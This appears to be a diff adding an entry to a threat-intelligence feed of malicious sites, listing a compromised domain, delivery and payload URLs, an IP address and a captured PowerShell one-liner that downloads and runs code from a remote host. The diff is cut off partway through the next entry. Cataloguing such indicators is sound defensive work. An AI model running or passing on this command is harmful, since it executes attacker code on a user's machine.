@@ -1,5 +1,24 @@
 [
   {
+    "UrlDomain": "aphonikaudio.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/125d0ae4c5f1e71b"
+    ],
+    "IP": [
+      "45.13.185.40"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/125d0ae4c5f1e71b')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/125d0ae4c5f1e71b"
+    ],
+    "ReportId": "cmwpuofwl242l0oml14schfmq",
+    "ScannedAt": "2026-11-21T03:30:27.889000+00:00"
+  },
+  {
     "UrlDomain": "k-landscape.com",
     "DeliveryUrl": [
       "cdn-speed.beer",
